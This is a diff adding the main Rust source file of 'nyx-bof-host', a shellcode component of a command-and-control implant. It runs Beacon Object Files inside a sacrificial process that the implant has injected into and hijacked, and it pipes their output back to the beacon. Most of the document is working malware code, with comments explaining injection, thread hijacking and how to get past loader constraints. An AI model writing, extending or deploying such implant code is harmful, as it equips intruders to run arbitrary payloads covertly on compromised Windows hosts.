@@ -1,0 +1,207 @@
+//! nyx-bof-host — B3 BOF sacrificial-process host (PIC blob).
+//!
+//! Standalone `#![no_std]` cdylib compiled to raw position-independent
+//! shellcode (`bof-host.bin`, see `regen.sh`) through the same PIC pipeline
+//! as the LAYER2 loader (nightly + `x86_64-pc-windows-gnu` + `-Zbuild-std` +
+//! dumper reachability extraction). The implant embeds the blob
+//! (`include_bytes!` in `bof.rs`), section-delivers it into a suspended
+//! sacrificial process whose stdout is a pipe back to the beacon
+//! (`inject.rs::create_sacrificial_isolated`), and resumes the main thread at
+//! blob offset 0 with `rcx` = packed payload pointer.
+//!
+//! ## Payload layout (rcx on entry)
+//!
+//! `[u32 blob_len][COFF blob][u32 args_len][args (CS beacon.h packing)]`
+//!
+//! The blob runs the COFF exactly like the inline loader (`bof.rs`): parse →
+//! W^X section map → relocate → resolve the Beacon-API externals against the
+//! Rust shims → call `go(args, alen)`. The difference is the output path:
+//! `BeaconPrintf`/`BeaconOutput` write straight to the inherited stdout pipe
+//! (`WriteFile(GetStdHandle(STD_OUTPUT_HANDLE))`) instead of a static capture
+//! buffer, and the process ends with `ExitProcess(status)` — the parent reads
+//! the pipe to EOF and maps a non-zero exit code (crash, loader error) to
+//! `Response::Err`.
+//!
+//! ## Dumper-enforced constraints (see nyx-pic-dumper `relayout.rs`)
+//!
+//! - **NO writable statics** anywhere in the reachable closure:
+//!   - the global allocator ([`minialloc`]) is stateless — kernel32
+//!     `GetProcessHeap`/`HeapAlloc`/`HeapFree` are re-resolved per call (no
+//!     cached-address atomics like ntalloc's);
+//!   - there is no static capture buffer and no static `ARGS_PTR` — the
+//!     `BeaconDataParse(NULL, 0)` args fallback reads the args pointer the
+//!     entry stashed in the TEB `ArbitraryUserPointer` slot (gs:[0x28]; the
+//!     `args_len` u32 sits immediately before the args bytes);
+//!   - `BeaconGetSpawnTo` (needs a writable static scratch buffer) is
+//!     deliberately NOT in the shim table — a BOF referencing it fails load
+//!     with a loud "unresolved external" (isolated mode is a受限交付 subset;
+//!     inline execution keeps the full shim set).
+//! - **NO static tables holding pointers** (they would emit base relocations
+//!   the raw blob cannot fix up): the shim table is a `match` on the external
+//!   name, exactly like `bof.rs::beacon_api_addr`.
+//! - The shims are only reached **indirectly** (address taken → `lea`), which
+//!   the dumper's direct-branch BFS does not follow — [`shim_keepalive`] adds
+//!   a never-taken direct call edge to every shim so the closure keeps them.
+
+#![no_std]
+#![no_main]
+#![feature(alloc_error_handler)]
+
+extern crate alloc;
+
+mod exec;
+mod minialloc;
+mod shim;
+
+use core::ffi::c_void;
+
+/// Largest COFF blob the host accepts (sanity cap on attacker-influenced
+/// input — a real BOF is kilobytes; 16 MiB is generous).
+const MAX_BLOB: u32 = 16 * 1024 * 1024;
+/// Largest CS-packed args buffer accepted (same rationale).
+const MAX_ARGS: u32 = 1024 * 1024;
+
+// Register the stateless process-heap allocator so Vec/String work under
+// #![no_std]. Stateless because the PIC dumper refuses writable statics —
+// resolution happens per call instead of being cached in atomics (ntalloc's
+// pattern, which is unusable here).
+#[global_allocator]
+static ALLOC: minialloc::ProcessHeapAlloc = minialloc::ProcessHeapAlloc;
+
+#[panic_handler]
+fn _panic(_info: &core::panic::PanicInfo) -> ! {
+    // panic = abort (profile). A spin pins a core in the sacrificial child —
+    // prefer a clean exit; the parent maps the non-zero code to an error.
+    exit_process(0xC000_0001);
+}
+
+#[alloc_error_handler]
+fn _alloc_error(_layout: core::alloc::Layout) -> ! {
+    // Mirrors the implant shell's dedicated OOM exit code (0xAD).
+    exit_process(0xAD);
+}
+
+/// Resolve `ExitProcess` and leave the process with `code`. Diverges.
+fn exit_process(code: u32) -> ! {
+    if let Some(addr) =
+        unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"ExitProcess") }
+    {
+        let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(addr) };
+        f(code);
+    }
+    // Defensive trap — only reached if kernel32 is gone (catastrophic).
+    loop {
+        core::hint::spin_loop();
+    }
+}
+
+/// PIC entry point — blob offset 0 after extraction. `packed` (rcx) points at
+/// the `[u32 blob_len][blob][u32 args_len][args]` payload the implant appended
+/// after the code in the delivered section.
+///
+/// Ends with `ExitProcess(status)`: the hijacked main thread has no valid
+/// caller frame to `ret` into (the implant overwrote Rip at the process-entry
+/// thunk), and the exit code is the parent's crash/error signal (0 = clean,
+/// 1 = loader error, anything else = the BOF's own ExitProcess / a crash
+/// converted by the OS).
+///
+/// # Safety
+/// Called by the implant via a hijacked thread context in a sacrificial
+/// process. `packed` must point at the well-formed payload above (the parent
+/// built it; the length caps below reject absurd values).
+#[no_mangle]
+pub unsafe extern "C" fn nyx_bof_host_entry(packed: *const u8) -> ! {
+    // Keep the indirectly-reached Beacon-API shims inside the dumper's
+    // reachability closure (never executes at runtime — see shim_keepalive).
+    shim_keepalive(packed);
+
+    let status = unsafe { entry_run(packed) };
+    exit_process(status);
+}
+
+/// Parse the packed payload, stash the args pointer for the dataparse
+/// fallback, and run the BOF. Returns the ExitProcess code.
+unsafe fn entry_run(packed: *const u8) -> u32 {
+    if packed.is_null() {
+        shim::write_line(b"[bof-host] null payload pointer");
+        return 1;
+    }
+    let blob_len = unsafe { (packed as *const u32).read_unaligned() };
+    if blob_len == 0 || blob_len > MAX_BLOB {
+        shim::write_line(b"[bof-host] bad blob_len");
+        return 1;
+    }
+    let blob = unsafe { core::slice::from_raw_parts(packed.add(4), blob_len as usize) };
+    let args_len_off = 4 + blob_len as usize;
+    let args_len = unsafe { (packed.add(args_len_off) as *const u32).read_unaligned() };
+    if args_len > MAX_ARGS {
+        shim::write_line(b"[bof-host] bad args_len");
+        return 1;
+    }
+    let args_ptr = unsafe { packed.add(args_len_off + 4) };
+
+    // Stash the args pointer in the TEB ArbitraryUserPointer slot (gs:[0x28])
+    // so BeaconDataParse(NULL, 0) can recover it without a writable static
+    // (dumper constraint). The args_len u32 sits immediately before the args
+    // bytes, so the shim reads the length from [ptr-4]. The sacrificial
+    // process is ours; nothing else uses the slot.
+    unsafe {
+        core::arch::asm!(
+            "mov qword ptr gs:[0x28], {}",
+            in(reg) args_ptr as usize,
+            options(nostack, preserves_flags),
+        );
+    }
+
+    match unsafe { exec::run(blob, args_ptr, args_len as i32) } {
+        Ok(()) => 0,
+        Err(msg) => {
+            shim::write_line(b"[bof-host] ");
+            shim::write_line(msg.as_bytes());
+            shim::write_line(b"\n");
+            1
+        }
+    }
+}
+
+/// Never-taken direct call edges to every Beacon-API shim.
+///
+/// The PIC dumper builds the blob by walking DIRECT calls/jumps from the
+/// entry export. The BOF reaches the shims indirectly — their addresses are
+/// taken (`lea`) in [`shim::beacon_api_addr`] and patched into COFF
+/// relocations — so without these edges the walk would prune every shim and
+/// the `lea` patch step would fail with "references unreachable code". The
+/// guard is opaque (`black_box`) and always false at runtime: `packed` is a
+/// page-aligned section pointer, never 1. Every shim called here is
+/// null-tolerant, so even a hypothetical execution would be harmless.
+fn shim_keepalive(packed: *const u8) {
+    if core::hint::black_box(packed as usize) != 1 {
+        return;
+    }
+    unsafe {
+        shim::BeaconPrintf(0, core::ptr::null(), 0, 0, 0, 0, 0, 0);
+        shim::BeaconOutput(0, core::ptr::null(), 0);
+        shim::BeaconDataParse(core::ptr::null_mut(), core::ptr::null(), 0);
+        shim::BeaconDataExtract(core::ptr::null_mut(), core::ptr::null_mut());
+        shim::BeaconGetInt(core::ptr::null_mut());
+        shim::BeaconGetShort(core::ptr::null_mut());
+        shim::BeaconGetStr(core::ptr::null_mut());
+        shim::BeaconDataInt(core::ptr::null_mut());
+        shim::BeaconDataShort(core::ptr::null_mut());
+        // Pure shims (no memory writes) need their results sunk into
+        // black_box: otherwise the optimizer deletes the "dead" keepalive
+        // call and the dumper loses the out-of-line body beacon_api_addr
+        // lea's (IsAdmin/DataLength fired exactly that gate).
+        let _ = core::hint::black_box(shim::BeaconDataLength(core::ptr::null_mut()));
+        let _ = core::hint::black_box(shim::BeaconIsAdmin());
+        // RevertToken returns nothing — it carries an in-body optimizer
+        // barrier instead (see shim.rs).
+        shim::BeaconRevertToken();
+        shim::BeaconCleanupProcess(core::ptr::null_mut());
+        shim::BeaconInformation(core::ptr::null_mut());
+        // Also keep the exec stage functions reachable-from-entry honest:
+        // (exec::run is a direct call from entry_run, so it and everything it
+        // touches is already in the closure — nothing extra needed here.)
+        let _ = core::ptr::null::<c_void>();
+    }
+}
